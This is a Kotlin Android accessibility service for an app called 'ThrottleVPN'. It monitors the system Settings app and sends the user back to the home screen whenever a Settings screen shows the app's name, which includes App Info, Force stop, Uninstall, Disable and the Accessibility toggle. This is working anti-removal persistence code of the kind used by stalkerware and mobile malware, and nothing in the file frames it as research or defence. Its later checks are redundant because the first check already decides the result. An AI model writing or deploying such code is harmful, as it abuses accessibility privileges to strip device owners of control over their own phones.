import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo

class ProtectionAccessibilityService : AccessibilityService() {

    private val myAppName = "ThrottleVPN" // Match app title
    private val settingsPackageName = "com.android.settings"

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // Intercept when user is inside system Settings
        if (packageName == settingsPackageName) {
            val rootNode = rootInActiveWindow ?: return

            if (isAttemptingTamper(rootNode)) {
                // Instantly send user back to the home screen
                performGlobalAction(GLOBAL_ACTION_HOME)
            }
        }
    }

    private fun isAttemptingTamper(node: AccessibilityNodeInfo): Boolean {
        // 1. Check if user opened App Info for this app
        val appMatches = node.findAccessibilityNodeInfosByText(myAppName)
        if (appMatches.isNotEmpty()) {
            return true
        }

        // 2. Check if user is trying to turn off Accessibility for this service
        // Matches screen titles or toggle entries referencing your app name
        val accessibilityMatches = node.findAccessibilityNodeInfosByText("Accessibility")
        if (accessibilityMatches.isNotEmpty() && appMatches.isNotEmpty()) {
            return true
        }

        // 3. Check for specific dangerous button IDs or localized text
        val forceStopButtons = node.findAccessibilityNodeInfosByText("Force stop")
        val uninstallButtons = node.findAccessibilityNodeInfosByText("Uninstall")
        val disableButtons = node.findAccessibilityNodeInfosByText("Disable")

        if ((forceStopButtons.isNotEmpty() || uninstallButtons.isNotEmpty() || disableButtons.isNotEmpty()) 
            && appMatches.isNotEmpty()) {
            return true
        }

        return false
    }

    override fun onInterrupt() {
        // Handle service interruption if needed
    }
}